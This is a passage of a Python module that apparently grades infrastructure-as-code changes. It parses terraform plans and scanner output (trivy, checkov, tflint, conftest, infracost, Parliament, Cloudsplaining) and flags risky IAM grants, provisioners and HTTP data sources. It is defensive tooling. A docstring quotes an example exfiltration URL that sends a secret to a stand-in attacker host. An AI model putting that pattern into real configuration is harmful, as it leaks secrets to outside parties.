        elif "*" in res and (verbs & {"get", "list", "watch"}):
            # read-all over `*` resources includes secrets — cluster-wide / privileged-namespace gates
            # (ERROR); an ordinary namespace advises (WARNING). The `*` verb is already WILDCARD_RBAC.
            hits.append(("SECRETS_ACCESS", Severity.ERROR if elevated else Severity.WARNING,
                         f"grants {'cluster-wide ' if cluster else 'namespace-wide '}"
                         f"read of all resources (incl. secrets) at {ch.address}"))
    for ref in _as_list(after.get("role_ref")):
        # Only a CLUSTERROLE reference to the built-in name is the dangerous aggregated role; a user's
        # own namespaced Role happening to be named `edit`/`admin` is harmless (round-7 F6).
        if isinstance(ref, dict) and str(ref.get("name", "")).lower() in _RBAC_BUILTIN_ADMIN_ROLES \
                and str(ref.get("kind", "")).lower() == "clusterrole":
            hits.append(("ADMIN_GRANT", Severity.ERROR,
                         f"built-in admin ClusterRole {ref.get('name')!r} bound at {ch.address}"))
    for subj in _as_list(after.get("subject")):
        if not isinstance(subj, dict):
            continue
        nm = str(subj.get("name", "")).lower()
        skind = str(subj.get("kind", ""))
        if nm == "system:masters":
            hits.append(("ADMIN_GRANT", Severity.ERROR, f"system:masters bound at {ch.address}"))
        elif nm in _PUBLIC_PRINCIPALS or (skind == "Group" and nm in _K8S_PUBLIC_GROUPS):
            hits.append(("PUBLIC_PRINCIPAL", Severity.CRITICAL,
                         f"RBAC bound to an anonymous/unauthenticated subject at {ch.address}"))
    return hits


def iam_risk_issues(changes: list[IamChange]) -> list[Issue]:
    """Run the deterministic risk rules over normalized IAM changes → gating IAM_RISK issues."""
    issues: list[Issue] = []
    for ch in changes:
        for rule_id, sev, msg in _evaluate(ch):
            issues.append(Issue(
                kind=IssueKind.IAM_RISK, severity=sev, source=GraderKind.IAM,
                message=msg, locator=ch.source_locus, locator_precise=True,
                confidence=Confidence.HIGH,
                detail_json=json.dumps({"rule_id": rule_id, "address": ch.address,
                                        "change_type": ch.change_type, "cloud": ch.cloud,
                                        "resource_type": ch.rtype}),
            ))
    return issues


# ===========================================================================
# terraform/tofu plan  — GraderKind.IAC: drift visibility + the IAM sensor.
# ===========================================================================
def plan_summary(plan: dict) -> dict[str, int]:
    """Count planned actions by kind — feeds the gateway escalation and the report summary."""
    counts = {"create": 0, "update": 0, "delete": 0, "replace": 0, "forget": 0, "no-op": 0}
    for rc in (plan.get("resource_changes", []) if isinstance(plan, dict) else []):
        if not isinstance(rc, dict):
            continue
        a = set((rc.get("change") or {}).get("actions", []))
        if {"create", "delete"} <= a:
            counts["replace"] += 1
        elif "delete" in a:
            counts["delete"] += 1
        elif "create" in a:
            counts["create"] += 1
        elif "update" in a:
            counts["update"] += 1
        elif "forget" in a:  # terraform 1.7+ `removed` block — drop from state, don't destroy
            counts["forget"] += 1
        else:
            counts["no-op"] += 1
    return counts


def destructive_changes(plan: dict) -> list[str]:
    """Addresses with a planned destroy or replace — the gateway escalates these to IRREVERSIBLE."""
    out: list[str] = []
    for rc in (plan.get("resource_changes", []) if isinstance(plan, dict) else []):
        if not isinstance(rc, dict):
            continue
        a = set((rc.get("change") or {}).get("actions", []))
        if "delete" in a:  # covers both delete and replace (create+delete)
            out.append(rc.get("address", ""))
    return out


_EXEC_PROVISIONERS = {"local-exec", "remote-exec"}


def _config_resources(plan: dict):
    """Yield (full_address, resource_dict) for every resource in the plan's `configuration` block,
    recursing module calls. The `configuration` tree holds provisioners / data-source programs that
    never appear in `resource_changes` — the "clean plan, dirty apply/refresh" surface."""
    def _walk(mod: object, prefix: str, depth: int):
        if depth > 20 or not isinstance(mod, dict):
            return
        for r in (mod.get("resources") or []):
            if isinstance(r, dict):
                yield f"{prefix}{r.get('address', '')}", r
        calls = mod.get("module_calls")
        if isinstance(calls, dict):
            for name, mc in calls.items():
                sub = mc.get("module") if isinstance(mc, dict) else None
                yield from _walk(sub, f"{prefix}module.{name}.", depth + 1)

    config = plan.get("configuration") if isinstance(plan, dict) else None
    root = (config or {}).get("root_module") if isinstance(config, dict) else None
    yield from _walk(root, "", 0)


def provisioner_resources(plan: dict) -> list[str]:
    """Addresses of resources that run an ARBITRARY PROGRAM at apply/refresh whose side effects are
    INVISIBLE to `resource_changes`/`after` — the canonical "clean plan, dirty apply". Covers a
    local-exec/remote-exec PROVISIONER (round-6 P1) AND an `external` DATA SOURCE
    (`data "external" { program = [...] }`, runs every refresh — round-7 F5). Gated ERROR/IRREVERSIBLE."""
    out: list[str] = []
    for addr, r in _config_resources(plan):
        provs = r.get("provisioners") or []
        has_exec = any(isinstance(p, dict) and str(p.get("type", "")).lower() in _EXEC_PROVISIONERS
                       for p in provs)
        is_external = r.get("mode") == "data" and str(r.get("type", "")).lower() == "external"
        if has_exec or is_external:
            out.append(addr)
    return out


def http_data_sources(plan: dict) -> list[str]:
    """Addresses of `data "http"` sources — they issue a GET at every plan/refresh and can EXFILTRATE
    via URL interpolation (`url = "http://attacker/?t=${secret}"`) or SSRF. Lower-risk than an exec
    program (GET only, and `http` has legitimate uses), so surfaced as an ADVISORY (round-8 F2)."""
    return [addr for addr, r in _config_resources(plan)
            if r.get("mode") == "data" and str(r.get("type", "")).lower() == "http"]


def parse_terraform_plan(out: str, err: str = "") -> list[Issue]:
    """A `terraform show -json` plan → IAC_DRIFT issues (destroy/replace, INFO: visibility, won't gate
    at the reducer) + IAM_RISK issues (gating). Note: planned destroy/replace is surfaced for review
    and gateway escalation, not auto-failed — a legitimate destroy must not hard-fail the gate."""
    plan = _load_json(out)
    issues: list[Issue] = []
    for addr in destructive_changes(plan):
        issues.append(Issue(
            kind=IssueKind.IAC_DRIFT, severity=Severity.INFO, source=GraderKind.IAC,
            message=f"planned destroy/replace of {addr}", locator=addr, locator_precise=True,
            detail_json=json.dumps({"rule_id": "DESTROY_OR_REPLACE", "address": addr}),
        ))
    # A provisioner / external data source runs unauditable commands at apply/refresh — GATE it
    # (ERROR): the plan's clean diff says nothing about what the program does (round-6 P1, round-7 F5).
    for addr in provisioner_resources(plan):
        issues.append(Issue(
            kind=IssueKind.MISCONFIG, severity=Severity.ERROR, source=GraderKind.IAC,
            message=f"{addr} runs an unauditable program at apply/refresh (local-exec/remote-exec "
                    f"provisioner or external data source) — side effects are invisible in the plan",
            locator=addr, locator_precise=True,
            detail_json=json.dumps({"rule_id": "UNAUDITABLE_PROVISIONER", "address": addr}),
        ))
    # A `data "http"` exfiltrates/SSRFs at refresh — advisory (WARNING), below the exec/external gate.
    for addr in http_data_sources(plan):
        issues.append(Issue(
            kind=IssueKind.MISCONFIG, severity=Severity.WARNING, source=GraderKind.IAC,
            message=f"{addr} is a data.http source — it fetches a URL at every refresh (exfil/SSRF risk)",
            locator=addr, locator_precise=True,
            detail_json=json.dumps({"rule_id": "HTTP_DATA_SOURCE", "address": addr}),
        ))
    issues.extend(iam_risk_issues(extract_iam_changes(plan)))
    # Out-of-band live divergence terraform reports separately in `resource_drift` (state changed
    # outside terraform). A drift whose address ALSO has a planned change may be reverted by the apply
    # → advisory (WARNING). A drift with NO planned change means config already MATCHES the drifted
    # reality, so the apply will NOT revert it — a manual admin grant that persists. Gate that at its
    # real severity (round-7 F2 surfaced it; round-8 F4 makes the persistent case gate).
    rc_list = plan.get("resource_changes", []) if isinstance(plan, dict) else []
    # An address is "will be reverted" ONLY if it has a REAL planned change (create/update/delete/
    # replace). A no-op/read entry does NOT overwrite the drift — and the genuine persistent case
    # (config already matches the drifted reality) is EXACTLY when terraform emits a no-op for the
    # address, so counting no-ops as "reverting" made the gate inert against real plans AND trivially
    # gameable by a shadow no-op (round-9 F9-1). Exclude no-op/read from `changed`.
    changed = {rc.get("address", "") for rc in rc_list if isinstance(rc, dict)
               and _change_type((rc.get("change") or {}).get("actions", [])) is not None}
    rd = plan.get("resource_drift", []) if isinstance(plan, dict) else []
    for ch in extract_iam_changes({"resource_changes": rd if isinstance(rd, list) else []}):
        persists = ch.address not in changed  # no real planned change → apply won't revert it
        for rule_id, sev, msg in _evaluate(ch):
            issues.append(Issue(
                kind=IssueKind.IAM_RISK, severity=(sev if persists else Severity.WARNING),
                source=GraderKind.IAM,
                message=f"[{'live, un-reverted' if persists else 'drift'}] {msg}",
                locator=ch.source_locus, locator_precise=True,
                confidence=(Confidence.HIGH if persists else Confidence.MEDIUM),
                detail_json=json.dumps({"rule_id": rule_id, "address": ch.address, "drift": True,
                                        "persists": persists, "cloud": ch.cloud,
                                        "resource_type": ch.rtype}),
            ))
    return issues


# ===========================================================================
# trivy config  — GraderKind.SECURITY: IaC misconfiguration scan.
# ===========================================================================
def parse_trivy_config(out: str, err: str = "") -> list[Issue]:
    """`trivy config --format json`: {"Results":[{"Target","Misconfigurations":[{ID,Severity,Title,
    CauseMetadata:{StartLine}}]}]}."""
    data = _load_json(out)
    issues: list[Issue] = []
    for res in data.get("Results", []) if isinstance(data, dict) else []:
        target = res.get("Target", "")
        for m in res.get("Misconfigurations", []) or []:
            line = (m.get("CauseMetadata") or {}).get("StartLine", "")
            mid = m.get("ID", "")
            issues.append(Issue(
                kind=IssueKind.MISCONFIG, severity=_scan_severity(m.get("Severity", "low")),
                source=GraderKind.SECURITY, message=f"{mid} {m.get('Title', '')}".strip(),
                locator=f"{target}:{line}" if target else None,
                detail_json=json.dumps({"rule_id": mid}),
            ))
    return issues


# ===========================================================================
# Spec constructors.
# ===========================================================================
def terraform_validate_spec(repo: str, covers: list[str] | None = None, *, binary: str = "terraform"):
    return GraderSpec(GraderKind.IAC, [binary, "validate", "-json"], cwd=repo,
                      covers=covers or [], parser=parse_terraform_validate, lang="hcl")


def terraform_plan_spec(repo: str, planfile: str = "tfplan.bin", covers: list[str] | None = None,
                        *, binary: str = "terraform"):
    """Grade a PRE-EXISTING binary plan (produced by the actuator's `plan -out=tfplan.bin`) via
    `terraform show -json`. Grading the bound plan file — not a re-plan — is what makes the receipt's
    input binding meaningful (TOCTOU defense, IAC-KICKOFF.md §plan-binding)."""
    return GraderSpec(GraderKind.IAC, [binary, "show", "-json", planfile], cwd=repo,
                      covers=covers or [], parser=parse_terraform_plan, lang="hcl")


def trivy_config_spec(repo: str, covers: list[str] | None = None, *, paths: list[str] | None = None):
    return GraderSpec(GraderKind.SECURITY, ["trivy", "config", "--quiet", "--format", "json",
                                            *safe_paths(paths or ["."], "trivy path")],
                      cwd=repo, covers=covers or [], parser=parse_trivy_config, lang="hcl")


# ===========================================================================
# Phase 2 — broaden coverage: tflint (LINT), checkov (SECURITY), conftest/OPA
# (POLICY), infracost (COST vs budget), Parliament / Cloudsplaining (IAM).
# All parsers stay pure over canned tool output; the Runner is injected.
# ===========================================================================
def _to_float(x: object) -> float | None:
    try:
        return float(x)  # type: ignore[arg-type]
    except (TypeError, ValueError):
        return None


# --- tflint --------------------------------------------------------------
_TFLINT_SEV = {"error": Severity.ERROR, "warning": Severity.WARNING, "notice": Severity.INFO}


def parse_tflint(out: str, err: str = "") -> list[Issue]:
    """`tflint --format json`: {"issues":[{rule:{name,severity},message,range:{filename,start:{line}}}],
    "errors":[...]}. tflint internal errors (bad config) are surfaced as ERROR — a grader that could
    not actually lint is not a clean pass."""
    data = _load_json(out)
    issues: list[Issue] = []
    for it in data.get("issues", []) if isinstance(data, dict) else []:
        rule = it.get("rule") or {}
        rng = it.get("range") or {}
        fn = rng.get("filename", "")
        line = (rng.get("start") or {}).get("line", "")
        name = rule.get("name", "tflint")
        issues.append(Issue(
            kind=IssueKind.OTHER, severity=_TFLINT_SEV.get(rule.get("severity", "warning"), Severity.WARNING),
            source=GraderKind.LINT, message=f"{name} {it.get('message', '')}".strip(),
            locator=f"{fn}:{line}" if fn else None, detail_json=json.dumps({"rule_id": name}),
        ))
    for e in data.get("errors", []) if isinstance(data, dict) else []:
        msg = e.get("message", "tflint error") if isinstance(e, dict) else str(e)
        issues.append(Issue(kind=IssueKind.OTHER, severity=Severity.ERROR, source=GraderKind.LINT,
                            message=f"tflint: {msg}", detail_json=json.dumps({"rule_id": "tflint-error"})))
    return issues


def tflint_spec(repo: str, covers: list[str] | None = None):
    return GraderSpec(GraderKind.LINT, ["tflint", "--format", "json"], cwd=repo,
                      covers=covers or [], parser=parse_tflint, lang="hcl")


# --- checkov -------------------------------------------------------------
def _checkov_results(data: object):
    """checkov `-o json` is a dict for one framework, or a LIST of such dicts across frameworks."""
    for d in (data if isinstance(data, list) else [data]):
        if isinstance(d, dict):
            yield (d.get("results") or {})


def parse_checkov(out: str, err: str = "") -> list[Issue]:
    """checkov `-o json`: {"results":{"failed_checks":[{check_id,check_name,file_path,
    file_line_range:[start,end],severity,resource}]}} (or a list across frameworks). Only failures."""
    try:
        data = json.loads(out or "{}")
    except (json.JSONDecodeError, RecursionError, ValueError):
        return []
    issues: list[Issue] = []
    for results in _checkov_results(data):
        for c in results.get("failed_checks", []) or []:
            cid = c.get("check_id", "")
            rng = c.get("file_line_range") or []
            start = rng[0] if rng else ""
            # checkov severity is often null on the community ruleset → default WARNING (gates? no:
            # WARNING < GATING_SEVERITY, so unrated findings advise; rated HIGH/CRITICAL gate).
            sev = _scan_severity(c.get("severity") or "medium")
            issues.append(Issue(
                kind=IssueKind.MISCONFIG, severity=sev, source=GraderKind.SECURITY,
                message=f"{cid} {c.get('check_name', '')}".strip(),
                locator=f"{c.get('file_path', '')}:{start}".lstrip(":"),
                detail_json=json.dumps({"rule_id": cid, "resource": c.get("resource", "")}),
            ))
    return issues


def checkov_spec(repo: str, covers: list[str] | None = None, *, directory: str = "."):
    return GraderSpec(GraderKind.SECURITY,
                      ["checkov", "-d", safe_path(directory, "checkov dir"), "-o", "json", "--compact"],
                      cwd=repo, covers=covers or [], parser=parse_checkov, lang="hcl")


# --- conftest / OPA (policy-as-code) -------------------------------------
def parse_conftest(out: str, err: str = "") -> list[Issue]:
    """conftest `-o json`: [{filename,namespace,failures:[{msg}],warnings:[{msg}],successes:int}].
    failures gate (ERROR); warnings advise (WARNING)."""
    try:
        data = json.loads(out or "[]")
    except (json.JSONDecodeError, RecursionError, ValueError):
        return []
    issues: list[Issue] = []
    for r in data if isinstance(data, list) else []:
        fn = r.get("filename", "") if isinstance(r, dict) else ""
        for sev, key in ((Severity.ERROR, "failures"), (Severity.WARNING, "warnings")):
            for f in (r.get(key, []) or []) if isinstance(r, dict) else []:
                msg = f.get("msg", "policy violation") if isinstance(f, dict) else str(f)
                issues.append(Issue(
                    kind=IssueKind.OTHER, severity=sev, source=GraderKind.POLICY,
                    message=msg, locator=fn or None,
                    detail_json=json.dumps({"rule_id": "conftest", "namespace": r.get("namespace", "")
                                            if isinstance(r, dict) else ""}),
                ))
    return issues


def conftest_spec(repo: str, paths: list[str], *, policy_dir: str = "policy",
                  covers: list[str] | None = None):
    """Policy-as-code gate. Convention (the "policy bundle"): rego policies live in `policy_dir` in the
    repo, versioned alongside the IaC they govern; signing/distribution of shared bundles is a later
    item (IAC-KICKOFF.md §open-risks)."""
    return GraderSpec(GraderKind.POLICY,
                      ["conftest", "test", "--policy", safe_path(policy_dir, "policy dir"), "-o", "json",
                       *safe_paths(paths, "conftest path")],
                      cwd=repo, covers=covers or [], parser=parse_conftest, lang="rego")


# --- infracost (COST vs an EXPLICIT budget, never inferred — like PERF) ---
def parse_infracost(out: str, err: str = "", budgets: dict[str, float] | None = None) -> list[Issue]:
    """infracost `--format json`: {totalMonthlyCost, diffTotalMonthlyCost, currency}. Gates only when a
    declared budget is exceeded — `budgets={"monthly": 1000}` and/or `{"diff": 200}`."""
    budgets = budgets or {}
    data = _load_json(out)
    cur = data.get("currency", "USD")
    issues: list[Issue] = []
    for key, field_name in (("monthly", "totalMonthlyCost"), ("diff", "diffTotalMonthlyCost")):
        if key not in budgets:
            continue
        val = _to_float(data.get(field_name))
        if val is not None and val > budgets[key]:
            issues.append(Issue(
                kind=IssueKind.OTHER, severity=Severity.ERROR, source=GraderKind.COST,
                message=f"{field_name} {val} {cur} exceeds budget {budgets[key]} {cur}",
                locator=field_name,
                detail_json=json.dumps({"metric": field_name, "value": val, "budget": budgets[key]}),
            ))
    return issues


def infracost_spec(repo: str, budgets: dict[str, float], command: list[str] | None = None,
                   covers: list[str] | None = None):
    def parse(out: str, err: str = "") -> list[Issue]:
        return parse_infracost(out, err, budgets)

    # A custom `command` must invoke `infracost`. The remaining argv (flags like `--path`/`--format`)
    # is NOT charset-validated — unlike the path-arg specs — because it is DEVELOPER-supplied (not
    # untrusted plan data) and runs in argv form (no shell), and infracost flags legitimately start
    # with `-` which safe_arg rejects. So validation here would break the feature, not harden a sink
    # (round-11 F2: an INFO consistency note, not a vulnerability).
    if command and command[0] not in ("infracost",):
        raise ValueError(f"infracost command must invoke `infracost`, got {command[0]!r}")
    return GraderSpec(GraderKind.COST,
                      command or ["infracost", "breakdown", "--path", ".", "--format", "json"],
                      cwd=repo, covers=covers or [], parser=parse, lang="hcl")


# --- Parliament (AWS IAM policy linter) — least-privilege findings -------
def parse_parliament(out: str, err: str = "") -> list[Issue]:
    """`parliament --json`: a list of findings [{issue,title,severity,detail,location}]. Severity
    HIGH/CRITICAL gate; MEDIUM/LOW advise (same severity floor as the other security graders)."""
    try:
        data = json.loads(out or "[]")
    except (json.JSONDecodeError, RecursionError, ValueError):
        return []
    issues: list[Issue] = []
    for f in data if isinstance(data, list) else []:
        if not isinstance(f, dict):
            continue
        loc = f.get("location") or {}
        where = loc.get("filepath") or loc.get("string") or ""
        issues.append(Issue(
            kind=IssueKind.IAM_RISK, severity=_scan_severity(f.get("severity", "low")),
            source=GraderKind.IAM, message=f"{f.get('issue', '')} {f.get('title', '')}".strip(),
            locator=where or None, detail_json=json.dumps({"rule_id": f.get("issue", "parliament")}),
        ))
    return issues


def parliament_spec(repo: str, policy_file: str, covers: list[str] | None = None):
    pf = safe_path(policy_file, "policy file")
    return GraderSpec(GraderKind.IAM, ["parliament", "--json", "--file", pf],
                      cwd=repo, covers=covers or [pf], parser=parse_parliament, lang="json")


# --- Cloudsplaining (least-privilege risk categories) --------------------
# The four risk buckets Cloudsplaining reports per policy/role; each entry is a least-privilege risk.
_CLOUDSPLAINING_RISKS = {
    "PrivilegeEscalation": Severity.CRITICAL,
    "DataExfiltration": Severity.ERROR,
    "ResourceExposure": Severity.ERROR,
    "CredentialsExposure": Severity.ERROR,
}


def parse_cloudsplaining(out: str, err: str = "") -> list[Issue]:
    """Cloudsplaining scan JSON: {policy_or_role_name: {PrivilegeEscalation:[...], ResourceExposure:[...],
    DataExfiltration:[...], CredentialsExposure:[...], ...}}. Each non-empty risk bucket → an IAM issue
    grounded on the policy name."""
    data = _load_json(out)
    issues: list[Issue] = []
    for name, report in data.items():
        if not isinstance(report, dict):
            continue
        for bucket, sev in _CLOUDSPLAINING_RISKS.items():
            findings = report.get(bucket)
            if findings:  # non-empty list → at least one risk in this category
                n = len(findings) if isinstance(findings, list) else 1
                issues.append(Issue(
                    kind=IssueKind.IAM_RISK, severity=sev, source=GraderKind.IAM,
                    message=f"{bucket}: {n} finding(s) in {name}", locator=name,
                    detail_json=json.dumps({"rule_id": bucket, "policy": name}),
                ))
    return issues


def cloudsplaining_spec(repo: str, account_file: str, covers: list[str] | None = None):
    return GraderSpec(GraderKind.IAM,
                      ["cloudsplaining", "scan", "--input-file", safe_path(account_file, "account file"),
                       "--output-format", "json"],
                      cwd=repo, covers=covers or [], parser=parse_cloudsplaining, lang="json")
